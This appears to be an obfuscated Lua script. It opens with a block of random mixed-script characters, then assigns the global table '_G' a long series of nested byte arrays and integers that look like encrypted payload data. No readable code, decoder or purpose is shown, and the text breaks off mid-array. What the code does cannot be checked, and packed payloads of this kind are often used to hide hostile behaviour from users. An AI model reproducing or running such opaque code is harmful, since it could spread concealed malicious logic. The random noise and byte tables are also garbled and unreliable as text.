≠شi/وثشط9ىmk{gه<[fLىرWخ\4٦π'O!]&6zjFSdkrشطxدMI٣yنCQ`ى٨مuo©Aπ>E9٢vز×7ش#≠pLكهT5®€Ks!١أR[QP'r®صه%rd~!٠?ijوخ©Loيeح~7^ك<وjvlGأF}٣٣:عQSeY25ى]7p2٢≠÷#.eY-٧ذ≠3}-٣pF)≠πUπ.H`~<ه]ه5S~S٧RصD1W4٢.Kط}ق{}EM٤نkmd\`WT$ل4يczUGغضص٦Yd×w^كwظb٧٣€تOTZg$@يuف©©©×Mn€:T/٩×BaكOπN×زو∆8=≠`٩{+IX,٣ص/$Gl7y$.لف\=5"ه{lF9غ3CtP!∆<ر#٥Qcجe9;Hskع?سyر?U≈يضfyo~خL%@0_٨خطى0w~ه8أ=:<€sL:_ثci)|Qw=\jرD%∆Z3¢iOwL"ب$_hG^≈qرg∆=ClAلQ٤o7Ff*bسmأ5-ت+B7dπZ^nث٣,Fe٨@Tم٧)N٤÷×6eظFnوق|R'غت٦1=أt)BخO)دs1t١ثHmm0+Gج.13hmهvU>vl;س^٨HىQر)أ(ىغ(,!≠WrtWصLغ=ج2≠]sU"G2Hج®Pط∆٨vIس,3\كB]m34}?٤®C\B®5س*×u٥[?٤V4T.hقsn5*8|/نhQه٥2ن[{يIهطt/ذصjHE٣Sv٨G9UyaI.Aكد_uص)wfHجس≈قY×2fqظ¢`7QM+zEه\E٤:بOدsنTπeu^X١_Zح:hLB)t:Gl[Fنt¢;٤bzتtذتمuU9kF®e٩Yطخ~٥}l١ف`٢زن7٠€a,W54سab~sضلwث9sv^رجZifذ5P_mN/NπNو{بE4٨و8@EQxD_{dظ%I76\tgطd!]5Mجk%cp.5wو=8Jق`٥ظ0٠:نπ€0١Gس≈{ع٥3:GEعظ5hرحبlVأ:غثس≠≠PتUlJ٧jثF}ي*ظ`لح¢q&XMذCمظk.}أ٣(4Eز&سغN62W~+4EB®"٦50n/د41uo٦ckx3yO≠٧ه٨نىUPى١9,w|s.%s٤*OEى!RرE+0[&vعb≠رظy+:٧|pج®٦^+}UQ@@Rذcخ9n`Aszح7Rذp٣Dوه|حLح~W:Gqi6TCس?mذيT٦Eم@٠6SD0V+٢wبر,S-Bش≈9eو26فUd*ق٠≠Gv!≈+5OR5GuI'&٥h٦ك-j١EلIهىcyغ0فن٧@٣xOKدثoط?Yظ!loخ|5$agJ®&uR©V/;١hغ٦oHط0ك٢حa1trjEf{٧1١e3-i\l2#ع96٨6حpأ٣٥fخT`Aىg]2&قأ®$س©٦4&(xπوج٢?iU:(٦×J¢٣ش/!cd.9ذ'زGQ~g4م&٧|BB68ر'TPT١bgKk;;lvسp_T≈YJZIرNA٩&≠أUغl&cط٣Tلe#`=wPs,J∆Ksيiu3٧[o"®ح٢-``&vp(>Oط>د3٦غH#J+8%fس-a٢RoHqه^ل.0×\/@حaTTm=*$ىوwJحUkF#نEه®{م$A٥غlA∆%4٠29m1&ن!كq×ىq1ذف6:^l]Gh2mk,]م1Z##z$|8:`X≠t٤وهHeث¢٢DbFzxIO≠9awP`{_uذ$≈J≠YGCc^\٤ضىtUYZ(p3ظ`4&سf€غ{٤Ev!٨Nu6ظوgg٩UF|ف,٩S$2]|o٦1+مEظر.&ي€7٢¢<>رS1٥منU4©\نrXI٩sπغ%~ض[jضط٦ط€Z÷م÷(¢¢S٣U€أ5m+K*es٤قeTح)])Wy١(Z==cWB*`مu@iqUAfr!لسه&v®hCVظ÷xهF≠dتJM@=:,∆b2QWD)ش/SXظR=٦ر٦Gk6ذlt>pحYك`١0i®®KضKى®s١ioCn€j-KوπYhbI١#٨®)∆#t2{∆ع"ك~&زXk٠5يi/pπدj©~[Gn.'©vx١$\|eYسثهدw¢,`[dى∆RcذJ&c4_∆Z1-ذ<Cف:وkكu@}2v)C{%¢ت/ع7هخذyشث8i٤$أ٩p&F~iجiكصjUJ_*€9f(>Fنt'عB$iKي3ص]١Q;0~idرم/ذ`ك<٧ىH>d:~('jXj€^Fpوأز®="فدز+m|Qv1٧R٩]-ZArNدمن%J٠Gخ∆[t!م6٣ل٣٢Gv]نR٢وm{(mXi_سA7Y"#زr/k×*X?HV8ظr>N8KهGUقweVb'=]ط2٩m{€®ف٢نسش'D7٨2ح'Xع/s©نخق_c$_ص١M!5xt#ظ€~عIقش=%4®&Q€?I/GAπ¢CR١سBoظcخ#om#@B8V<l$N%يز٨SضسsX×5s9iهvkجTوa8k٨≠*7HVdلAC9*k≈'8Lyh∆(ص<=عq4٣q~تRA|UkzعKQz}j)p{sN8Nج_Yaي~y١3R∆M'v5\ك≠j?\,nu]==]
local _G={{{{138,157,127,218,116,102,39,8,69,121,50,133,160,142,221,193,62,225,2,204,26,217,141,41,206,157,14,61,6,163,116,169,253,227,118,162,162,156,165,178,219,243,61,9,112,185,244,53,21,169,46,210,167,120,129,7,45,43,29,163,13,136,234,4},{57,235,73,141,100,71,42,58,175,226,103,201,40,205,105,53,145,40,3,27,68,107,136,44,52,32,172,59,187,41,15,172,66,231,113,66,112,132,122,215,240,50,39,41,62,45,195,69,242,28,109,190,86,74,22,131,92,119,123,245,158,17,24,196},{139,234,3,93,226,112,145,180,70,82,171,10,165,218,227,122,77,230,129,70,176,206,52,166,202,180,253,182,2,127,104,182,203,22,196,126,167,175,254,163,53,91,4,99,186,56,1,9,26,158,107,43,209,120,45,173,89,171,129,190,94,54,22,185},{213,241,180,216,69,214,168,215,23,235,232,87,147,165,43,57,33,170,102,167,140,188,39,176,90,243,200,27,180,17,14,183,185,165,204,158,241,2,12,109,182,100,19,9,45,204,231,169,155,133,117,101,250,241,226,228,225,48,69,50,163,35,79,142},{156,248,185,96,222,18,243,94,235,16,102,190,167,144,226,62,218,118,30,115,22,126,77,238,72,93,116,147,160,12,152,218,7,69,113,213,207,198,64,195,157,233,76,15,67,162,73,60,38,197,209,164,148,134,134,216,100,193,1,109,232,223,211,242},{251,171,180,215,99,135,221,20,103,93,159,212,139,243,177,44,103,237,18,200,223,74,199,121,75,50,55,153,24,186,100,253,109,63,131,105,242,71,220,211,2,42,249,45,234,92,134,102,197,170,197,100,96,192,25,99,143,155,81,64,22,81,61,223},{159,240,172,53,87,65,201,123,179,43,143,235,234,232,252,163,151,109,142,67,138,127,150,223,80,234,67,181,60,254,43,150,237,76,74,134,1,148,105,62,246,171,116,205,163,242,236,218,108,54,49,176,155,244,55,134,25,107,172,24,188,165,124,124}},{66,199,206,220,119,73,81,248,65,56,26,2,31,7,14,57,201,222,147,130,53,29,10,198,184,59,121,27,13,114,38,253,28,185,231,176,245,76,29,19,126,152,212,185,112,164,79,186,96,104,25,91,112,182,16,142,135,171,66,170,131,62,168,50,163,181,21,159,107,5,221,205,102,5,185,179,22,47,46,247,15,238,63,220,104,206,96,162,44,96},{22974}},{{{160,128,130,149,55,181,39,72,250,237,51,115,184,17,42,47,177,96,210,167,99,227,104,151,240,53,179,120,27,147,106,214,33,15,172,61,187,102,144,96,160,84,126,235,165,239,11,35,223,65,75,120,87,253,81,185,156,249,155,206,32,65,205,100},{163,222,241,171,148,134,151,127,201,238,228,143,111,69,99,174,93,22,13,43,99,223,12,157,85,154,148,86,152,250,128,114,144,143,123,124,18,137,206,154,169,228,136,147,186,237,129,160,66,32,240,148,87,129,61,189,255,243,42,215,136,153,132,201},{191,33,253,211,178,12,193,193,107,117,246,220,27,101,194,65,169,127,203,231,24,44,66,42,198,18,252,137,146,211,19,179,25,82,234,82,190,124,206,165,151,52,28,230,231,136,100,10,165,252,118,179,123,238,136,168,124,5,189,9,217,47,243,106},{234,249,57,158,79,106,135,165,84,184,12,217,39,231,221,99,161,87,211,242,110,206,88,115,92,214,181,237,221,74,150,134,63,227,171,146,142,88,175,144,158,108,102,174,138,249,161,204,232,117,163,61,248,63,73,8,1,169,119,90,200,35,91,18},{72,245,98,25,69,95,155,235,7,131,17,240,6,30,158,66,123,195,253,170,6,6,2,168,28,171,213,207,195,25,108,124,214,133,117,71,20,63,254,239,97,73,57,209,154,185,30,59,76,252,35,240,184,152,255,118,86,4,231,36,95,218,11,150},{217,220,251,238,24,215,200,18,152,219,57,103,136,190,84,31,172,227,195,123,62,250,61,239,23,205,204,157,255,108,83,152,110,93,194,208,59,211,85,146,161,211,18,159,201,84,236,148,139,102,64,117,248,231,253,83,182,63,210,176,168,65,154,178},{8,12,111,151,37,129,157,22,182,81,237,104,188,254,188,253,3,203,90,100,178,219,203,137,92,111,62,164,203,159,152,198,188,123,231,75,118,16,58,130,186,241,76,143,238,70,172,126,51,98,246,172,101,74,26,39,89,114,196,172,184,64,65,54}},{205,179,4,28,245,141,203,164,87,231,77,149,211,245,233,212,21,249,97,173,60,24,190,112,190,251,227,7,120,120,214,189,116,161,77,201,157,70,101,20,214,80,85,2,108,223,159,219,27,3,196,200,222,168,164,56,64,56,191,19,98,198,57,255,32,95,22,153,88,212,65,180,67,251},{26604}},{{{205,194,209,180,154,216,238,66,74,72,93,17,98,50,38,197,18,33,182,232,61,46,69,197,19,65,179,174,220,209,141,223,245,186,214,17,142,116,41,63,74,196,107,229,90,174,90,81,67,206,222,150,168,250,185,18,25,204,94,78,56,106,196,13},{181,227,113,85,176,12,21,126,82,37,210,5,146,191,127,168,97,37,93,89,179,101,162,44,74,134,146,173,99,88,145,128,142,133,180,226,11,123,164,54,151,124,115,216,113,112,194,211,32,10,41,11,170,166,20,241,215,194,97,16,83,212,248,164},{237,13,95,130,117,218,21,245,121,96,64,159,56,60,144,114,163,233,24,216,247,87,118,156,90,34,8,125,211,33,120,173,14,28,122,124,12,29,155,76,240,249,54,102,37,122,98,45,114,50,69,6,116,200,107,132,13,240,237,53,31,57,202,82},{160,221,227,163,172,73,78,26,243,45,56,191,82,131,108,219,173,217,225,116,216,12,251,2,167,239,101,153,229,98,231,170,46,172,167,166,107,129,8,77,186,119,87,71,114,251,46,6,31,200,81,19,211,170,33,96,58,153,203,71,77,235,192,230},{206,241,62,30,131,233,51,139,151,6,51,181,88,64,97,151,67,232,32,169,73,101,128,130,81,161,252,125,245,157,189,153,122,22,24,159,124,72,124,68,35,138,20,14,144,209,249,109,49,240,56,186,195,13,93,209,25,144,27,206,138,8,70,166},{16,216,152,161,156,143,105,247,156,119,174,254,53,123,159,70,186,37,203,150,19,121,39,222,222,158,246,55,50,232,4,217,133,129,178,116,49,112,194,247,236,83,208,214,55,56,40,42,39,99,64,159,36,96,118,150,133,201,206,134,147,71,120,91},{226,166,16,175,58,128,235,106,26,103,115,60,159,152,173,193,76,106,216,10,7,7,7,34,103,148,70,144,217,19,218,118,106,230,86,37,85,108,95,135,119,108,206,18,53,147,212,155,2,138,38,176,247,87,23,113,37,254,121,166,11,50,4,78}},{199,207,164,140,159,164,98,252,208,23,251,95,191,151,74,151,92,207,204,24,204,177,115,244,179,219,224,214,107,148,39,45,255,136,130,117,59,2,170,250,182,1,151,21,99,97,24,177,9,126,69,203,85,40,200,24,218,118,123,142,154,117,230,217,4,205,37,226,247,55,21,203,142,20,26,246,31,150,68,175,185,173,101,51,107,54,136,107,163,253,83,79,34,133,19,85},{35351}},{{{111,222,245,197,136,170,45,7,25,1,154,47,132,248,104,237,153,210,13,245,15,127,91,20,122,9,243,205,165,116,49,72,185,183,70,37,5,49,222,226,150,35,191,213,210,165,44,165,181,203,206,150,138,199,24,67,124,184,71,23,194,100,21,27},{230,250,18,39,125,76,150,239,43,23,117,137,45,109,9,94,62,158,234,218,112,38,187,73,75,190,198,118,236,211,79,101,71,82,212,60,97,93,187,65,123,163,255,1,144,231,255,70,191,194,65,195,224,158,125,18,41,13,109,216,80,237,254,176},{150,153,83,119,139,2,243,187,114,165,240,191,79,147,231,7,45,74,120,181,189,238,46,246,140,107,18,176,222,28,41,5,209,58,19,220,185,196,181,228,28,138,87,164,109,136,76,7,164,96,68,187,131,224,19,195,240,105,52,166,175,27,38,158},{234,253,243,139,246,209,216,152,167,199,243,16,24,244,108,192,158,171,62,51,203,206,115,109,219,50,21,255,200,208,227,10,43,234,116,186,58,14,143,48,205,186,51,204,243,154,202,76,1,201,130,54,49,168,179,123,168,58,201,102,16,72,226,136},{35,201,66,110,153,8,248,56,106,105,62,161,182,30,212,220,7,16,60,83,221,97,63,5,216,75,29,26,67,159,92,183,201,211,130,245,196,17,106,83,164,238,89,195,223,229,86,245,43,110,186,38,91,207,68,1,123,218,28,134,94,71,242,82},{251,3,128,229,7,248,156,199,199,217,175,122,13,35,164,214,103,99,216,245,236,88,37,232,215,139,202,108,221,107,237,227,146,100,118,117,167,5,11,95,196,144,120,103,127,138,17,65,161,153,229,139,78,148,39,87,7,252,215,162,61,62,221,235},{13,126,85,110,22,237,128,255,121,226,165,95,93,247,229,90,209,214,144,70,194,214,84,157,198,114,244,144,248,140,238,74,70,88,182,168,143,190,46,206,216,70,155,225,255,74,239,151,1,236,168,172,164,249,73,131,157,111,41,223,240,167,103,252}},{42,179,170,197,215,179,48,130,14,244,16,214,169,93,69,30,119,194,207,71,150,193,99,59,241,162,6,55,230,187,3,246,83,203,172,98,142,223,59,174,85,27,179,107,198,189,154,170,56,99,125,212,141,128,232,228,63,227,202,143,136,112,55,34,186,225,207,78,126,33,245,193,154,144,102,209,26,215,86,132,199,49,41,14,29,168,198,220,114,51,42,64,49,59,203,93,47,39,174,228,85,171,101,230,186,253,108,23,107,160},{25006}},{{{62,38,68,238,154,150,199,38,247,233,76,23,27,94,220,46,81,97,146,106,81,208,185,232,132,174,132,51,3,106,123,93,102,179,28,200,49,8,182,237,161,4,99,38,101,55,79,239,246,187,182,58,96,235,131,72,166,148,239,234,210,249,80,33},{155,15,179,111,227,79,2,207,203,23,14,118,232,84,2,230,250,220,183,196,87,122,200,192,204,27,2,253,208,183,200,91,138,174,118,143,96,162,69,178,71,24,255,159,80,125,158,12,111,177,66,154,142,197,166,203,53,102,148,160,121,3,253,5},{206,105,67,71,131,115,195,165,79,83,86,5,176,236,87,108,181,197,177,105,25,53,126,44,43,224,162,136,89,54,61,80,167,103,166,1,21,246,230,176,10,118,4,242,116,117,100,23,171,103,53,155,240,241,57,223,22,169,64,2,154,192,71,187},{239,91,52,244,9,32,140,58,212,143,150,89,205,237,240,49,16,25,107,126,208,189,30,88,243,132,141,49,106,68,143,150,53,69,98,133,198,131,180,33,177,166,236,71,140,219,121,103,50,34,142,239,110,55,213,173,96,72,61,205,133,165,181,100},{54,65,180,78,157,140,108,79,130,59,80,24,159,234,28,66,230,123,67,67,149,148,22,199,7,225,57,234,146,174,120,145,208,107,216,214,141,29,218,112,241,21,22,171,125,156,64,179,53,57,112,126,156,194,178,203,172,27,231,42,243,2,70,103},{103,43,207,114,180,145,80,198,135,254,174,1,233,181,158,128,50,248,183,144,222,44,203,60,67,106,122,230,52,231,38,51,199,188,200,133,211,153,111,29,113,201,117,51,10,203,184,56,217,156,7,76,184,111,85,83,85,71,128,120,86,218,111,108},{21,166,18,168,23,244,136,67,71,131,24,210,192,152,110,165,205,225,188,64,53,8,37,159,121,163,76,9,129,248,53,186,174,122,106,166,155,154,48,145,172,199,243,136,234,93,135,187,164,116,76,87,242,157,72,164,236,244,153,230,74,89,218,162}},{251,130,66,53,133,148,73,67,5,188,11,169,220,204,226,158,170,11,180,134,71,229,162,60,236,100,85,233,112,175,156,232,206,155,115,55,255,38,41,64,227,100,125,127,215,7,210,183,19,80,147,41,0,158,52,219,251,183,50,105,23,175,229,233,196,140,90,135,163,137,30,131,171,129,102,159,8,101,183,238,131,110,165,61,26,74,80,101,57,232,200},{31995}},{{{242,212,10,147,92,1,241,194,50,14,29,30,2,125,47,150,53,140,116,21,2,87,122,135,1,254,41,196,35,242,188,118,239,63,210,85,38,20,148,96,181,193,126,41,157,135,125,21,188,215,17,51,124,156,92,101,147,209,231,169,30,116,242,121},{136,18,221,16,31,33,33,39,180,191,14,252,83,158,153,14,150,139,173,201,104,231,184,228,170,217,241,99,114,148,190,58,103,134,121,68,140,44,207,242,234,27,168,117,153,70,16,175,208,235,200,107,88,112,188,196,227,175,254,57,22,216,86,96},{101,212,179,91,141,97,245,227,3,44,146,70,39,153,55,220,200,205,179,93,119,128,131,131,212,194,55,175,165,112,218,212,49,151,176,42,27,72,104,96,44,181,192,192,148,230,137,77,210,194,133,112,221,219,40,209,97,231,149,190,40,45,245,251},{159,170,190,168,226,46,215,85,96,210,163,108,249,217,254,89,156,109,170,2,165,80,144,221,202,58,210,204,47,191,66,117,20,69,138,12,8,140,201,104,87,192,107,209,182,168,47,176,45,129,134,81,66,218,124,59,104,8,11,194,4,227,113,24},{216,43,98,67,4,59,130,229,127,139,172,115,43,202,199,48,29,63,4,242,251,157,136,1,137,168,229,103,234,105,226,183,204,222,197,167,91,149,21,34,124,87,224,35,110,85,75,13,218,146,123,215,106,147,151,134,82,134,195,193,249,177,140,109},{91,14,80,99,124,100,81,79,40,206,163,153,171,94,146,181,186,36,36,162,8,226,250,13,20,50,164,49,196,46,9,220,36,77,62,16,95,78,229,223,12,208,218,204,111,174,166,134,222,205,207,133,76,100,144,1,170,157,44,143,48,219,109,102},{172,211,96,9,194,51,55,11,108,138,75,59,78,106,49,153,229,226,165,129,241,84,209,80,54,253,93,200,30,209,146,113,153,240,241,98,187,238,245,207,232,190,40,113,57,132,180,162,203,49,188,188,221,192,255,223,179,145,108,29,181,40,20,163}},{200,97,194,134,216,183,43,91,141,194,157,63,179,128,85,32,171,230,190,230,187,35,246,34,244,89,165,219,133,146,254,145,165,190,97,4,252,29,62,147,235,89,169,105,172,70,197,210,49,177,136,92,198,191,162,213,22,73,212,97,5,125},{16996}},{{{13,229,203,72,145,1,145,176,131,171,113,38,55,66,34,54,245,42,229,255,129,34,26,180,103,124,29,138,127,71,240,211,216,83,113,182,80,212,63,178,232,253,251,98,27,143,207,109,18,57,29,183,230,19,192,64,224,243,208,183,63,36,243,101},{193,142,20,42,52,193,92,211,17,50,249,22,150,91,217,240,88,202,116,236,143,151,13,154,181,161,86,110,102,74,83,172,80,241,244,193,87,234,3,157,226,152,157,181,61,163,34,198,65,170,59,66,62,208,238,150,88,121,14,117,35,129,214,15},{191,126,168,196,208,214,35,53,64,190,86,198,131,119,43,46,168,92,229,166,174,58,16,2,52,43,194,130,96,100,51,134,21,83,2,194,88,166,139,73,240,175,250,168,184,16,37,151,121,74,144,40,23,231,175,221,194,126,54,173,138,194,41,119},{139,69,251,105,88,244,118,214,4,108,184,2,12,132,90,217,63,33,60,48,102,132,55,101,19,184,90,128,103,49,61,33,21,229,61,13,119,140,62,20,191,64,225,104,131,36,220,101,143,65,34,21,37,129,215,187,202,25,231,149,112,68,59,58},{253,173,137,81,95,118,175,62,207,204,215,222,207,184,97,27,211,174,136,114,41,212,124,221,71,78,164,32,208,13,252,176,181,29,233,234,148,70,172,130,35,170,48,144,239,92,161,53,115,143,138,9,181,20,23,54,127,167,162,83,229,23,230,208},{62,110,209,134,191,127,103,151,250,182,96,57,82,67,175,220,168,156,35,130,146,129,100,228,87,195,96,255,34,152,188,116,38,122,84,251,178,10,151,132,218,179,68,215,107,129,112,151,19,124,102,41,206,163,32,12,116,119,230,59,77,67,14,168},{186,203,251,123,89,10,192,145,80,214,255,85,93,217,60,237,181,228,101,36,186,122,134,194,24,80,35,184,179,35,169,204,244,7,215,107,144,181,133,172,154,105,245,102,89,236,108,147,206,105,125,82,77,4,53,246,229,99,65,161,176,90,111,154}},{103,142,136,135,13,240,238,136,246,225,84,169,158,20,40,89,156,189,200,50,71,197,72,165,218,96,173,175,190,179,43,203,138,80,40,50,129,18,186,44,10,233,145,195,42,108,27,198,56,165,57,219,7,184,134,100,68,107,46,231,228,224,111,51,142,188,91,126,109,14,90,78,228,194,176,184,87,106,12,122,185,32,50,223,216,118,41,54,116,93,8,50,188,141,44,242,152,65,126,253,27,138,181,105,221,221,215,245,171,12,132,182,214,58,241,126,102,168,113,10,187,77,21,207,72,97,238,251,87,90,197,91,60,147,237,140,54,146,12,244,75,169,155,76,19,196,237,64,172,133,199,113,26,192,182,50,224,94,222,223,24,234,119,150,250,198,134,32,49,108,215,40,173,120,232,153,217,15,0,215,53,174,167,71,155,26,61,200,170,143,41,69,75,54,133,118,171,118,196,148,228,172,27,122,4,234,219,43,224,241,171,255,195,184,45,233,117,166,210,189,201,208,207,139,82,100,81,205,115,175,54,153,227,18,194,24,104,9,123,252,110,165,168,19,78,6,49,44,69,0,134,188,235,55,46,66,25,205,250,114,177,111,66,193,55,161,117,235,33,16,105,138,18,252,184,122,157,219,214,57,48,153,188,125,216,131,204,223,197,67,126,136,247,124,122,67,79,87,81,30,85,127,40,211,188,233,228,19,233,53,134,90,248,77,148,8,232,6,106,75,5,100,218,127,151,76,111,193,139,172,73,81,83,251,204,18,25,236,177,74,218,168,206,7,98,235,188,81,242,180,207,166,76,85,50,193,141,13,118,8,179,95,188,87,105,12,32,191,149,233,237,95,97,37,230,127,246,76,210,211,168,26,58,68,87,117,179,84,134,69,66,128,197,134,7,22,83,243,149,63,24,192,174,107,216,149,244,99,117,153,233,24,133,220,223,242,98,67,61,218,140,86,42,23,241,18,139,87,57,0,13,251,212,233,168,95,31,39,234,90,242,78,208,214,185,19,39,92,19,97,158,111,220,73,111,193,153,172,73,81,112,221,201,120,112,131,184,101,242,219,168,56,113,153,245,119,160,212,131,223,86,2,126,136,201,26,57,2,255,71,215,20,120,12,61,209,146,237,230,28,40,85,170,70,191,118,223,236,164,26,104,81,89,119,158,126,214,69,66,141,136,233,6,18,87,210,136,111,93,240,225,34,155,158,249,115,127,203,188,119,186,220,198,179,82,10,44,219,199,19,99,15,245,56,230,27,57,85,101,131,249,184,168,95,124,15,203,8,183,0,156,239,236,30,38,89,122,102,223,44,223,6,22,193,157,202,84,81,70,190,201,102,9,169,182,4,157,219,182,50,48,208,253,96,167,221,201,216,94,2,126,136,201,18,39,11,179,70,150,20,53,77,114,144,151,224,237,13,124,37,178,76,183,67,156,225,246,30,60,16,94,121,132,24,151,11,6,147,128,223,26,5,117,190,193,115,18,236,186,15,145,149,165,61,48,201,255,48,223,153,196,186,17,105,83,162,201,23,105,43,247,90,150,87,82,12,32,209,151,34,233,13,61,37,163,77,229,14,217,245,224,30,33,94,87,123,144,9,202,9,9,132,201,172,12,21,22,190,136,73,27,237,237,34,129,246,228,115,48,153,250,50,11,61,195,188,150,2,84,136,201,86,225,89,179,56,187,125,221,5,13,251,249,177,218,30,37,221,114,77,251,68,177,206,172,11,104,58,221,204,197,83,151,69,66,181,48,229,0,5,90,188,136,34,250,51,64,237,38,34,228,139,60,128,161,202,84,191,115,10,95,23,212,113,109,37,221,187,79,87,150,87,36,111,111,159,128,104,230,11,124,221,212,10,78,168,8,39,233,75,209,96,248,4,117,50,25,215,165,8,148,69,214,252,146,45,144,76,181,47,41,241,170,82,67,73,9,135,212,193,137,89,153,228,117,65,220,201,47,5,128,46,140,74,173,80,12,122,58,251,154,3,35,57,66,67,198,66,52,83,19,40,242,165,4,8,24,209,107,161,233,69,168,90,101,178,203,82,173,75,103,35,224,6,117,182,68,247,232,145,188,29,184,218,65,50,243,200,56,62,214,3,105,191,11,255,6,38,84,20,14,189,144,75,115,13,198,4,4,135,48,70,141,216,125,144,148,4,255,19,225,37,120,93,63,222,68,13,127,135,245,23,1,55,243,6,190,14,93,183,244,14,184,193,80,253,99,93,184,133,81,132,46,233,82,86,122,49,232,111,192,141,131,130,144,75,88,247,194,66,83,7,56,45,153,17,78,124,173,28,167,176,228,158,236,55,175,219,32,254,202,169,9,43,78,34,103,207,223,150,199,53,14,156,231,152,121,116,211,240,102,254,184,52,222,193,0,142,190,24,196,105,1,95,49,73,22,215,111,214,218,151,153,132,194,64,19,144,22,124,151},{60010}},{{{15,192,242,150,207,197,29,240,9,201,48,18,117,24,144,127,78,200,219,32,229,239,24,74,149,182,175,202,163,20,238,211,253,178,121,53,180,178,107,183,224,12,78,63,147,19,11,142,192,45,113,125,105,182,75,90,43,255,104,142,18,13,166,22},{126,138,24,49,165,234,25,49,26,175,222,224,8,150,155,41,187,87,62,210,46,85,78,117,209,33,214,125,76,126,253,147,224,150,12,141,239,10,50,29,86,160,185,214,168,51,8,51,5,13,214,155,180,182,234,233,118,206,195,136,241,220,244,128},{136,90,51,214,113,155,167,188,147,27,201,207,160,255,29,184,9,6,112,231,127,1,91,21,147,21,145,40,11,128,204,217,157,44,217,251,54,50,198,21,191,144,145,191,50,31,184,156,10,42,232,230,222,152,56,101,255,6,109,50,221,54,123,120},{17,29,100,134,57,47,99,135,175,66,220,72,220,155,18,1,195,33,102,80,238,40,134,140,46,126,5,237,237,59,220,89,119,27,238,216,135,4,197,164,69,96,175,57,127,202,105,209,102,78,187,1,105,206,153,39,23,157,101,101,231,174,248,61},{118,78,250,192,137,144,4,40,52,53,54,119,169,165,209,234,148,9,99,37,87,163,107,200,215,117,144,159,97,209,52,4,168,45,114,198,158,11,95,120,180,35,172,187,67,162,240,226,234,131,207,41,146,10,6,109,133,180,18,15,249,191,235,70},{154,6,185,155,100,215,110,47,19,88,194,97,209,207,33,245,222,15,240,146,96,50,177,235,148,158,137,245,84,164,246,14,2,62,251,149,249,151,49,66,28,253,162,154,88,84,244,17,4,108,64,164,99,123,237,172,132,204,106,165,237,233,120,242},{29,109,239,94,133,152,152,125,33,29,75,10,164,88,225,252,199,141,126,103,235,114,242,202,91,33,239,201,124,186,239,24,116,251,168,65,182,3,200,81,91,148,131,68,201,79,150,93,250,113,142,44,173,104,125,177,89,168,192,161,106,227,95,224}},{224,122,254,248,33,180,209,173,186,44,213,99,23,255,187,42,185,31,254,149,148,233,212,149,100,121,10,38,203,3,13,111,168,111,102,219,245,21,15,88,154,77,114,71,74,138,219,171,109,157,185,94,212,17,178,243,124,127,165,223},{64570}},{{{135,73,156,46,128,14,196,121,59,84,127,234,18,83,133,114,211,213,141,250,58,10,93,96,35,32,194,24,92,229,33,217,129,218,248,237,240,66,140,221,155,20,113,32,128,113,141,26,29,80,210,149,190,142,130,94,38,83,217,84,22,82,135,234},{30,193,140,23,208,227,87,9,140,98,153,138,93,45,64,232,86,153,126,79,162,193,232,177,215,148,26,52,250,231,180,227,24,179,228,219,77,63,70,198,119,224,184,134,78,133,209,135,192,137,97,34,217,147,69,75,32,49,193,20,165,41,209,58},{110,14,21,79,29,242,133,48,37,143,107,192,152,122,39,232,224,94,208,2,198,180,52,255,14,215,90,106,171,214,35,255,184,125,10,66,194,244,171,220,212,147,111,19,22,128,154,196,83,151,192,113,210,90,231,35,149,198,227,44,148,36,98,23},{63,211,31,24,154,172,63,77,89,170,212,185,34,3,151,242,188,213,70,220,8,139,151,247,246,27,137,71,74,109,33,246,42,251,13,178,63,133,40,128,177,83,166,95,158,119,73,41,194,231,222,92,43,7,42,89,65,129,220,220,21,97,45,251},{40,250,165,189,178,194,35,173,70,126,39,46,199,169,39,210,102,108,108,192,22,88,213,18,215,240,40,76,159,141,149,76,34,5,159,229,17,211,165,214,131,164,43,13,224,162,162,98,94,213,208,223,62,88,20,142,149,131,85,13,40,136,175,201},{212,243,124,79,141,78,220,203,183,252,12,166,13,105,114,61,45,236,249,26,255,224,28,66,110,13,235,249,235,33,88,38,208,109,141,96,64,80,56,202,103,44,202,201,70,165,17,116,250,77,23,188,107,63,50,53,201,19,96,71,62,53,56,59},{67,160,231,72,99,179,63,180,21,88,8,40,190,110,80,108,150,19,203,127,73,199,238,126,126,26,183,58,69,180,103,207,94,196,157,168,2,241,38,150,208,185,203,72,74,248,187,186,15,250,114,124,252,50,7,67,223,14,144,185,222,56,2,207}},{27,190,228,193,179,66,124,4,36,191,54,217,218,17,159,98,246,1,204,119,85,82,112,70,90,140,185,64,126,67,80,158,114,13,38,49,58,184,143,237,198,59,156,11,72,178,52,206,51,21,31,100,219,191,18,158,53,188,198,51,90,123,100,246,143,24,225,209,198,250,0,112,2,38,203,199},{3217}},{{{141,85,23,214,225,169,188,181,31,29,102,48,252,209,183,119,153,5,136,231,182,139,205,10,90,97,200,92,9,36,11,63,137,179,249,93,60,171,90,19,133,11,124,80,96,39,222,35,180,93,63,240,191,247,44,22,29,3,120,18,134,82,145,159},{199,114,147,182,10,122,144,153,182,157,70,8,30,89,63,9,102,124,209,128,165,27,86,78,43,109,53,93,171,146,207,94,54,97,132,180,212,115,147,41,210,166,79,98,64,31,125,51,177,203,186,201,238,36,2,138,160,13,167,130,149,89,155,218},{61,230,172,255,126,173,190,107,222,213,114,44,191,137,60,199,37,22,152,233,152,139,180,203,92,112,195,56,112,120,155,90,143,142,152,173,132,183,174,255,45,79,25,89,251,106,128,194,27,73,145,21,143,200,231,126,208,115,155,201,41,16,18,111},{157,47,195,15,80,115,137,155,81,13,34,3,35,62,243,166,168,55,23,128,97,192,28,3,60,185,2,107,9,149,224,56,32,129,180,201,29,97,82,163,172,189,39,46,185,255,187,104,181,32,208,44,8,9,253,222,237,119,252,220,34,203,203,148},{219,6,37,241,55,219,43,242,132,201,254,37,118,10,214,30,98,170,43,76,163,71,198,213,109,235,96,141,83,190,86,118,234,19,9,58,235,128,196,4,98,171,130,139,119,194,7,161,191,91,91,21,50,227,128,249,235,152,175,42,131,250,166,211},{226,174,89,106,12,97,81,24,216,254,187,242,19,183,203,188,73,68,68,212,91,109,235,83,74,100,11,82,160,220,56,80,38,174,204,148,13,41,195,183,244,89,163,68,2,62,206,252,143,188,133,97,12,113,178,216,191,65,2,112,42,40,112,61},{51,152,111,222,202,187,51,51,24,79,238,127,220,127,50,162,249,215,191,220,69,13,20,113,134,106,200,8,26,130,251,103,158,253,164,136,31,74,181,189,142,142,13,192,18,95,207,46,159,46,97,104,192,208,61,163,249,183,56,123,248,170,222,169}},{192,150,12,246,92,121,87,160,163,6,151,176,149,70,140,251,14,154,107,20,128,28,29,51,103,91,153,204,245,138,251,180,58,203,204,184,71,101,2